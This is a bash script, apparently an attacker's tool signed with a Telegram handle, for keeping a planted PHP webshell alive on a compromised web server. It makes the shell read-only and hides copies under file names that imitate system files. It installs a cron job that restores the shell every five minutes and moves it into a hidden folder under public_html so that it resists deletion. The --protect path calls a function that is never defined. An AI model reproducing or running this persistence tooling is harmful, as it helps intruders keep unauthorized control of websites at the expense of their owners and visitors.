#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    echo -e "${CYAN}"
    echo -e "@JohenLastGen/t.me/johenlastgen"
    echo -e "${NC}"
}

WEBSHELL_PATH=""
BACKUP_DIR="$HOME/.system/backup"

check_file() {
    if [ ! -f "$WEBSHELL_PATH" ]; then
        echo -e "${RED}ERROR: File not found: $WEBSHELL_PATH${NC}"
        exit 1
    fi
    echo -e "${GREEN}OK: File found${NC}"
}

set_permission() {
    echo -e "\n${YELLOW}[1] Setting permission 555...${NC}"
    chmod 555 "$WEBSHELL_PATH"
    echo -e "${GREEN}OK: Permission set to 555${NC}"
}

create_backup() {
    echo -e "\n${YELLOW}[2] Creating hidden backups...${NC}"
    mkdir -p "$BACKUP_DIR"
    chmod 700 "$BACKUP_DIR"
    cp "$WEBSHELL_PATH" "$BACKUP_DIR/webshell_backup.php"
    chmod 400 "$BACKUP_DIR/webshell_backup.php"
    echo -e "${GREEN}OK: Backup created at $BACKUP_DIR/webshell_backup.php${NC}"
}

multiple_copy() {
    echo -e "\n${YELLOW}[3] Creating multiple copies...${NC}"
    
    LOCATIONS=(
        "/tmp/.systemd-httpd"
        "/dev/shm/.cache-php"
        "$HOME/.cache/.dbus-daemon"
        "$HOME/.local/share/.systemd"
        "$HOME/.config/.johen_backup"
    )
    
    for loc in "${LOCATIONS[@]}"; do
        cp "$WEBSHELL_PATH" "$loc" 2>/dev/null
        chmod 555 "$loc" 2>/dev/null
        if [ -f "$loc" ]; then
            echo -e "${GREEN}OK: Copied to: $loc${NC}"
        fi
    done
}

setup_cron() {
    echo -e "\n${YELLOW}[4] Setting up cron restore...${NC}"
    
    crontab -l 2>/dev/null | grep -v "Webshell_Backup\|Jlg Network" | crontab -
    
    (crontab -l 2>/dev/null
     echo "# JohenLastGen Webshell Protector"
     echo "*/5 * * * * [ -f $WEBSHELL_PATH ] || cp $BACKUP_DIR/webshell_backup.php $WEBSHELL_PATH && chmod 555 $WEBSHELL_PATH"
    ) | crontab -
    
    echo -e "${GREEN}OK: Cron restore installed (every 5 minutes)${NC}"
}

verify() {
    echo -e "\n${BLUE}════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}VERIFICATION${NC}"
    echo -e "${BLUE}════════════════════════════════════════════════════════════${NC}"
    
    echo -e "\n${YELLOW}Original file:${NC}"
    ls -la "$WEBSHELL_PATH"
    
    echo -e "\n${YELLOW}Backup files:${NC}"
    ls -la "$BACKUP_DIR/"
    
    echo -e "\n${YELLOW}Cron jobs:${NC}"
    crontab -l | grep -E "JohenLastGen|JLG NETWORK"
}

restore() {
    echo -e "\n${YELLOW}[Restore] Restoring webshell...${NC}"
    if [ -f "$BACKUP_DIR/webshell_backup.php" ]; then
        cp "$BACKUP_DIR/webshell_backup.php" "$WEBSHELL_PATH"
        chmod 555 "$WEBSHELL_PATH"
        echo -e "${GREEN}OK: Webshell restored${NC}"
    else
        echo -e "${RED}ERROR: Backup not found${NC}"
    fi
}

uninstall() {
    echo -e "\n${RED}Uninstalling...${NC}"
    crontab -l 2>/dev/null | grep -v "webshell_backup\|johen" | crontab -
    rm -rf "$BACKUP_DIR"
    rm -f /tmp/.systemd-httpd /dev/shm/.cache-php "$HOME/.cache/.dbus-daemon" 2>/dev/null
    echo -e "${GREEN}OK: Uninstall complete${NC}"
}

move_to_safe_folder() {
    echo -e "\n${YELLOW}[5] Moving to safe folder...${NC}"
    
    SAFE_FOLDER="$HOME/public_html/.system/cache"
    mkdir -p "$SAFE_FOLDER"
    chmod 555 "$SAFE_FOLDER"
    
    FILENAME=$(basename "$WEBSHELL_PATH")
    mv "$WEBSHELL_PATH" "$SAFE_FOLDER/$FILENAME"
    chmod 555 "$SAFE_FOLDER/$FILENAME"
    
    mkdir -p "$HOME/.backup"
    cp "$SAFE_FOLDER/$FILENAME" "$HOME/.backup/$FILENAME"
    chmod 400 "$HOME/.backup/$FILENAME"
    
    WEBSHELL_PATH="$SAFE_FOLDER/$FILENAME"
    
    echo -e "${GREEN}OK: Webshell moved to: $SAFE_FOLDER/$FILENAME${NC}"
    echo -e "${GREEN}OK: Folder permission: 555 (cannot delete file)${NC}"
    echo -e "${GREEN}OK: Backup: $HOME/.backup/$FILENAME${NC}"
}

show_help() {
    echo -e "Usage: $0 [OPTIONS] [WEBSHELL_PATH]"
    echo ""
    echo "Options:"
    echo "  -p, --protect    Protect webshell (default)"
    echo "  -r, --restore    Restore webshell from backup"
    echo "  -u, --uninstall  Remove all protections"
    echo "  -m, --move       Move to safe folder and protect"
    echo "  -h, --help       Show this help"
    echo ""
    echo "Example:"
    echo "  $0 /path/to/webshell.php"
    echo "  $0 --move /path/to/webshell.php"
    echo "  $0 --restore /path/to/webshell.php"
}

case "${1:-}" in
    -u|--uninstall)
        banner
        uninstall
        ;;
    -r|--restore)
        banner
        WEBSHELL_PATH="$2"
        check_file
        restore
        ;;
    -h|--help)
        banner
        show_help
        ;;
    -m|--move)
        banner
        WEBSHELL_PATH="$2"
        if [ -z "$WEBSHELL_PATH" ]; then
            show_help
            exit 1
        fi
        check_file
        move_to_safe_folder
        set_permission
        create_backup
        multiple_copy
        setup_cron
        verify
        echo -e "\n${GREEN}OK: WEBSHELL PROTECTED AND MOVED TO SAFE FOLDER${NC}"
        echo -e "${CYAN}JOHEN - @johenlastgen | @jlgnetwork${NC}"
        ;;
    -p|--protect|"")
        banner
        WEBSHELL_PATH="${2:-$1}"
        if [ -z "$WEBSHELL_PATH" ]; then
            show_help
            exit 1
        fi
        check_file
        set_permission
        create_backups
        multiple_copy
        setup_cron
        verify
        echo -e "\n${GREEN}OK: WEBSHELL PROTECTED${NC}"
        echo -e "${CYAN}Johen - Heker abal-abal | @johenlastgen${NC}"
        ;;
    *)
        banner
        echo -e "${RED}ERROR: Invalid option${NC}"
        show_help
        ;;
esac